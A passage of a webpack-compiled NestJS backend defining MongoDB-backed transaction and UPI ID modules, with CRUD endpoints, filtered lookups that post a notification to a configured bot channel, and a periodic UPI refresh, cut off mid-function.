class UpdateTransactionDto extends (0, swagger_1.PartialType)(create_transaction_dto_1.CreateTransactionDto) {
}
exports.UpdateTransactionDto = UpdateTransactionDto;


/***/ }),

/***/ "./src/components/transactions/schemas/transaction.schema.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/schemas/transaction.schema.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionSchema = exports.Transaction = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ../dto/create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
let Transaction = class Transaction {
};
exports.Transaction = Transaction;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Unique transaction ID (UTR)' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true,
        unique: true,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "transactionId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Amount involved in the transaction' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.Number,
        required: true,
        min: 0
    }),
    __metadata("design:type", Number)
], Transaction.prototype, "amount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Issue type reported by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "issue", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Description of issue reported by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Refund method selected by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "refundMethod", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User profile ID' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User chat ID' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'IP address of the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined'
    }),
    __metadata("design:type", String)
], Transaction.prototype, "ip", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Transaction status',
        enum: create_transaction_dto_1.TransactionStatus,
        default: create_transaction_dto_1.TransactionStatus.PENDING
    }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        enum: Object.values(create_transaction_dto_1.TransactionStatus),
        default: create_transaction_dto_1.TransactionStatus.PENDING,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Creation timestamp' }),
    (0, mongoose_1.Prop)({ type: Date }),
    __metadata("design:type", Date)
], Transaction.prototype, "createdAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last update timestamp' }),
    (0, mongoose_1.Prop)({ type: Date }),
    __metadata("design:type", Date)
], Transaction.prototype, "updatedAt", void 0);
exports.Transaction = Transaction = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'transactions',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                ret.id = ret._id;
                delete ret._id;
                return ret;
            },
        }
    })
], Transaction);
exports.TransactionSchema = mongoose_1.SchemaFactory.createForClass(Transaction);


/***/ }),

/***/ "./src/components/transactions/transaction.controller.ts":
/*!***************************************************************!*\
  !*** ./src/components/transactions/transaction.controller.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ./dto/create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
const update_transaction_dto_1 = __webpack_require__(/*! ./dto/update-transaction.dto */ "./src/components/transactions/dto/update-transaction.dto.ts");
const transaction_service_1 = __webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
let TransactionController = class TransactionController {
    constructor(transactionService) {
        this.transactionService = transactionService;
    }
    async create(createTransactionDto) {
        return this.transactionService.create(createTransactionDto);
    }
    async findOne(id) {
        return this.transactionService.findOne(id);
    }
    async findAll(transactionId, amount, issue, refundMethod, profile, chatId, ip, status, limit, offset) {
        return this.transactionService.findAll({ transactionId, amount, issue, refundMethod, profile, chatId, status, ip }, limit, offset);
    }
    async update(id, updateTransactionDto) {
        return this.transactionService.update(id, updateTransactionDto);
    }
    async delete(id) {
        return this.transactionService.delete(id);
    }
};
exports.TransactionController = TransactionController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Create a new transaction',
        description: 'Creates a new transaction record with the provided details'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.CREATED,
        description: 'Transaction created successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid input data provided.'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_transaction_dto_1.CreateTransactionDto]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get transaction by ID',
        description: 'Retrieves a specific transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction retrieved successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Get all transactions',
        description: 'Retrieves all transactions with optional filtering, pagination and sorting'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transactions retrieved successfully.',
        type: [transaction_schema_1.Transaction]
    }),
    (0, swagger_1.ApiQuery)({ name: 'transactionId', required: false, description: 'Filter by transaction ID (UTR)' }),
    (0, swagger_1.ApiQuery)({ name: 'amount', required: false, type: 'number', description: 'Filter by transaction amount' }),
    (0, swagger_1.ApiQuery)({ name: 'issue', required: false, description: 'Filter by issue type' }),
    (0, swagger_1.ApiQuery)({ name: 'refundMethod', required: false, description: 'Filter by refund method' }),
    (0, swagger_1.ApiQuery)({ name: 'profile', required: false, description: 'Filter by user profile' }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: false, description: 'Filter by chat ID' }),
    (0, swagger_1.ApiQuery)({ name: 'ip', required: false, description: 'Filter by IP address' }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, description: 'Filter by transaction status' }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: 'number', description: 'Number of records to return', example: 10 }),
    (0, swagger_1.ApiQuery)({ name: 'offset', required: false, type: 'number', description: 'Number of records to skip', example: 0 }),
    __param(0, (0, common_1.Query)('transactionId')),
    __param(1, (0, common_1.Query)('amount')),
    __param(2, (0, common_1.Query)('issue')),
    __param(3, (0, common_1.Query)('refundMethod')),
    __param(4, (0, common_1.Query)('profile')),
    __param(5, (0, common_1.Query)('chatId')),
    __param(6, (0, common_1.Query)('ip')),
    __param(7, (0, common_1.Query)('status')),
    __param(8, (0, common_1.Query)('limit')),
    __param(9, (0, common_1.Query)('offset')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, String, String, String, String, String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "findAll", null);
__decorate([
    (0, common_1.Put)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Update a transaction',
        description: 'Updates an existing transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction updated successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid input data provided.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_transaction_dto_1.UpdateTransactionDto]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Delete a transaction',
        description: 'Deletes a transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction deleted successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "delete", null);
exports.TransactionController = TransactionController = __decorate([
    (0, swagger_1.ApiTags)('Transactions'),
    (0, common_1.Controller)('transactions'),
    __metadata("design:paramtypes", [transaction_service_1.TransactionService])
], TransactionController);


/***/ }),

/***/ "./src/components/transactions/transaction.module.ts":
/*!***********************************************************!*\
  !*** ./src/components/transactions/transaction.module.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const transaction_service_1 = __webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts");
const transaction_controller_1 = __webpack_require__(/*! ./transaction.controller */ "./src/components/transactions/transaction.controller.ts");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let TransactionModule = class TransactionModule {
};
exports.TransactionModule = TransactionModule;
exports.TransactionModule = TransactionModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([
                { name: transaction_schema_1.Transaction.name, schema: transaction_schema_1.TransactionSchema },
            ]),
        ],
        controllers: [transaction_controller_1.TransactionController],
        providers: [transaction_service_1.TransactionService],
        exports: [transaction_service_1.TransactionService]
    })
], TransactionModule);


/***/ }),

/***/ "./src/components/transactions/transaction.service.ts":
/*!************************************************************!*\
  !*** ./src/components/transactions/transaction.service.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var TransactionService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
let TransactionService = TransactionService_1 = class TransactionService {
    constructor(transactionModel) {
        this.transactionModel = transactionModel;
        this.logger = new common_1.Logger(TransactionService_1.name);
    }
    async create(createTransactionDto) {
        this.logger.log(`Creating new transaction: ${JSON.stringify(createTransactionDto)}`);
        try {
            const existingTransaction = await this.transactionModel
                .findOne({ transactionId: createTransactionDto.transactionId })
                .exec();
            if (existingTransaction) {
                throw new common_1.BadRequestException('Transaction with this ID already exists');
            }
            const newTransaction = new this.transactionModel(createTransactionDto);
            const savedTransaction = await newTransaction.save();
            this.logger.log(`Transaction created successfully: ${savedTransaction.transactionId}`);
            return savedTransaction;
        }
        catch (error) {
            this.logger.error(`Error creating transaction: ${error.message}`, error.stack);
            throw error instanceof common_1.BadRequestException ? error : new common_1.BadRequestException('Failed to create transaction');
        }
    }
    async findOne(id) {
        this.logger.debug(`Finding transaction by ID: ${id}`);
        try {
            const transaction = await this.transactionModel.findById(id).exec();
            if (!transaction) {
                this.logger.warn(`Transaction not found with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            return transaction;
        }
        catch (error) {
            this.logger.error(`Error finding transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Invalid transaction ID format');
        }
    }
    async findAll(filters, limit = 10, offset = 0) {
        this.logger.debug(`Finding transactions with filters: ${JSON.stringify(filters)}`);
        try {
            let query = {};
            let transactions = [];
            let total = 0;
            if (filters.transactionId) {
                const transactionIdQuery = {
                    $or: [
                        { transactionId: filters.transactionId.toLowerCase() }
                    ]
                };
                if ((0, mongoose_2.isValidObjectId)(filters.transactionId)) {
                    transactionIdQuery.$or.push({ _id: filters.transactionId });
                }
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(transactionIdQuery)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(transactionIdQuery).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching transactionId: ${filters.transactionId}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            if (filters.ip) {
                query = { ip: filters.ip };
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching ip: ${filters.ip}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            if (filters.chatId) {
                query = { chatId: filters.chatId };
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching chatId: ${filters.chatId}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            const remainingFilters = {};
            if (filters.profile)
                remainingFilters['profile'] = filters.profile;
            if (filters.amount)
                remainingFilters['amount'] = filters.amount;
            if (filters.issue)
                remainingFilters['issue'] = filters.issue;
            if (filters.refundMethod)
                remainingFilters['refundMethod'] = filters.refundMethod;
            if (filters.status)
                remainingFilters['status'] = filters.status;
            if (Object.keys(remainingFilters).length > 0) {
                query = remainingFilters;
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
            }
            this.logger.debug(`Found ${total} transactions matching remaining filters`);
            await this.sendNotification(filters, total);
            return { transactions, total };
        }
        catch (error) {
            this.logger.error(`Error finding transactions: ${error.message}`, error.stack);
            throw new common_1.BadRequestException('Failed to fetch transactions');
        }
    }
    async sendNotification(filters, total) {
        try {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${encodeURIComponent(`Found ${total} transactions matching ip: ${filters.ip || 'N/A'}\nchatId: ${filters.chatId || 'N/A'}\ntransactionId: ${filters.transactionId || 'N/A'}\nprofile: ${filters.profile || 'N/A'}`)}`);
        }
        catch (error) {
            this.logger.error(`Failed to send notification: ${error.message}`);
        }
    }
    async update(id, updateTransactionDto) {
        this.logger.debug(`Updating transaction ${id} with data: ${JSON.stringify(updateTransactionDto)}`);
        try {
            const updatedTransaction = await this.transactionModel
                .findByIdAndUpdate(id, updateTransactionDto, {
                new: true,
                runValidators: true
            })
                .exec();
            if (!updatedTransaction) {
                this.logger.warn(`Transaction not found for update with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            this.logger.log(`Transaction ${id} updated successfully`);
            return updatedTransaction;
        }
        catch (error) {
            this.logger.error(`Error updating transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Failed to update transaction');
        }
    }
    async delete(id) {
        this.logger.debug(`Deleting transaction: ${id}`);
        try {
            const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();
            if (!deletedTransaction) {
                this.logger.warn(`Transaction not found for deletion with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            this.logger.log(`Transaction ${id} deleted successfully`);
            return deletedTransaction;
        }
        catch (error) {
            this.logger.error(`Error deleting transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Failed to delete transaction');
        }
    }
};
exports.TransactionService = TransactionService;
exports.TransactionService = TransactionService = TransactionService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(transaction_schema_1.Transaction.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], TransactionService);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.controller.ts":
/*!******************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.controller.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const upi_ids_service_1 = __webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts");
let UpiIdController = class UpiIdController {
    constructor(UpiIdService) {
        this.UpiIdService = UpiIdService;
    }
    async findOne() {
        return this.UpiIdService.findOne();
    }
    async update(updateUpiIdsdto) {
        return this.UpiIdService.update(updateUpiIdsdto);
    }
};
exports.UpiIdController = UpiIdController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get Upi Ids' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UpiIdController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update Upi Ids' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UpiIdController.prototype, "update", null);
exports.UpiIdController = UpiIdController = __decorate([
    (0, swagger_1.ApiTags)('UPI Ids'),
    (0, common_1.Controller)('upi-ids'),
    __metadata("design:paramtypes", [upi_ids_service_1.UpiIdService])
], UpiIdController);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.module.ts":
/*!**************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.module.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const upi_ids_service_1 = __webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts");
const upi_ids_controller_1 = __webpack_require__(/*! ./upi-ids.controller */ "./src/components/upi-ids/upi-ids.controller.ts");
const upi_ids_schema_1 = __webpack_require__(/*! ./upi-ids.schema */ "./src/components/upi-ids/upi-ids.schema.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let UpiIdModule = class UpiIdModule {
};
exports.UpiIdModule = UpiIdModule;
exports.UpiIdModule = UpiIdModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            UpiIdModule,
            npoint_module_1.NpointModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: upi_ids_schema_1.UpiIdSchema }]),
        ],
        providers: [upi_ids_service_1.UpiIdService],
        controllers: [upi_ids_controller_1.UpiIdController],
        exports: [upi_ids_service_1.UpiIdService],
    })
], UpiIdModule);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.schema.ts":
/*!**************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.schema.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdSchema = exports.UpiId = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let UpiId = class UpiId {
};
exports.UpiId = UpiId;
exports.UpiId = UpiId = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false,
        autoIndex: true,
        timestamps: false,
        toJSON: {
            virtuals: false,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], UpiId);
exports.UpiIdSchema = mongoose_1.SchemaFactory.createForClass(UpiId);
exports.UpiIdSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.service.ts":
/*!***************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.service.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let UpiIdService = class UpiIdService {
    constructor(UpiIdModel, npointSerive) {
        this.UpiIdModel = UpiIdModel;
        this.npointSerive = npointSerive;
        this.upiIds = {};
        this.findOne().then(() => {
            setInterval(async () => {
                await this.refreshUPIs();
                await this.checkNpoint();
            }, 5 * 60000);
        });
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async refreshUPIs() {
        console.log("Refreshing UPIs");
